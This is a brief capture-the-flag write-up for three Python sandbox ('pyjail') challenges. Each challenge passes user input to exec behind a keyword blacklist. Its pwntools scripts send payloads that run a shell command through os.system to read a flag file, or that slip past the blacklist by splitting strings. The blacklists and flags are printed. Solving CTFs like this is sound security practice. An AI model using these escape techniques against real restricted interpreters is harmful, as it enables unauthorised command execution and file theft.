# pyjails

## Challenge

All 3 pyjails allow for exeution of python on a remote server but with restricted words.

```py
userinput = input('>> ')
blacklist = [...] # different for each pyjail
for illegal in blacklist:
    if illegal in userinput.lower():
        raise Exception()
else:
    exec(userinput)
```

## Solve 1

```py
# blacklist = ['eval', 'exec', 'rm', 'kill', '+']

from pwn import *

r = remote('pyjail.ctf.maplebacon.org', 32003)
r.setLevel('DEBUG')

r.recvuntil(">> ")
r.sendline('import os;os.system("cat secrets/flag/topsecret.txt")')
r.recv()

# pyjail1: maple{welc0m3_to_the_w0rlD_oF_cod3_j4ilz}
```

## Solve 2

```py
# blacklist = ['eval', 'exec', 'import', 'os', '=', 'txt', 'read', 'dict', ';', ':', '\n', 'flag', 'subprocess', 'write', 'input', '_']

# ...
r.recvuntil(">> ")
r.sendline("print([i for i in open('fla'+'g.t'+'xt')])")
r.recv()

# maple{pyth0n_0n3_lInerz_UwU}
```

## Solve 3

```py
# blacklist = ['eval', 'exec', 'import', 'os', '=', 'txt', 'read', 'dict', ';', ':', '\n', 'flag', 'subprocess', 'write', 'input', '_', 'getattr', 'globals', 'update']


# ...
r.recvuntil(">> ")
r.sendline("print([i for i in open('fla'+'g.t'+'xt')])")
r.recv()

# pyjail3: maple{Did_u_kn0w_that_d0lph1ns_sl33p_with_one_eye_open}
```